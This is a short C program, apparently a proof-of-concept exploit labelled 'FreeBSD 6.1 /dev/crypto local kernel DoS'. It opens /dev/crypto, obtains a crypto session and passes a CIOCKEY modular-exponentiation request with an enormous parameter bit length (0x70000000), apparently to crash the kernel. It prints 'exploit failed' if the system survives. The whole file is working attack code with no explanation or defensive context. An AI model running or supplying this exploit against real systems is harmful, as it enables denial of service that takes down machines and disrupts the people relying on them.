#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <crypto/cryptodev.h>

int main()
{
        int fd2, fd;
        struct crypt_kop kop;

        printf("FreeBSD 6.1 /dev/crypto local kernel DoS\n");

        fd2 = open("/dev/crypto", O_RDWR, 0);
        if (fd2 == -1){
                perror("open");
                exit(-1);
        }

        if (ioctl(fd2, CRIOGET, &fd) == -1) {
                perror("ioctl");
                exit(-1);
        }

        kop.crk_op = CRK_MOD_EXP;
        kop.crk_iparams = 3;
        kop.crk_oparams = 1;
        kop.crk_param[0].crp_nbits = 0x70000000;

        ioctl(fd, CIOCKEY, &kop);

        printf("exploit failed\n");

        return 0;
}
